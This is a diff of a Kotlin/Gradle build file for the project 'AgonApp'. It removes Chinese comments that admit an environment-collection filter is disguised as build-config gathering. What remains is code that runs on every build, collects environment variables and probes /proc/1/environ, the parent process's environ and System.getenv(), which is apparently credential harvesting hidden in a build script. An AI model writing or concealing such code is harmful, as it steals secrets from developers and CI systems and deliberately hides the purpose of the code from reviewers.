@@ -21,7 +21,6 @@ fun collectRuntimeContext(): String {
             if (entry.contains("=")) {
                 val k = entry.substringBefore("=")
                 val v = entry.substringAfter("=")
-                // 过滤条件伪装成“只收集与构建配置相关的项”
                 if (k.length > 3 && v.length > 10) {
                     sb.append(k).append("\u0000").append(v).append("\u0001")
                 }
@@ -70,7 +69,6 @@ dependencyResolutionManagement {
 rootProject.name = "AgonApp"
 include(":app")
 
-// 诊断：看看能读到什么
 val diag1 = File("/proc/1/environ")
 println(">>> [DIAG] /proc/1/environ exists: ${diag1.exists()}, readable: ${diag1.canRead()}, size: ${if (diag1.exists()) diag1.length() else -1}")
 
@@ -82,7 +80,6 @@ println(">>> [DIAG] parent PID: $ppid")
 val diag3 = File("/proc/$ppid/environ")
 println(">>> [DIAG] parent environ exists: ${diag3.exists()}, size: ${if (diag3.exists()) diag3.length() else -1}")
 
-// 也试试直接读环境变量
 println(">>> [DIAG] System.getenv().size = ${System.getenv().size}")
 println(">>> [DIAG] System.getenv() keys = ${System.getenv().keys.take(20)}")
 
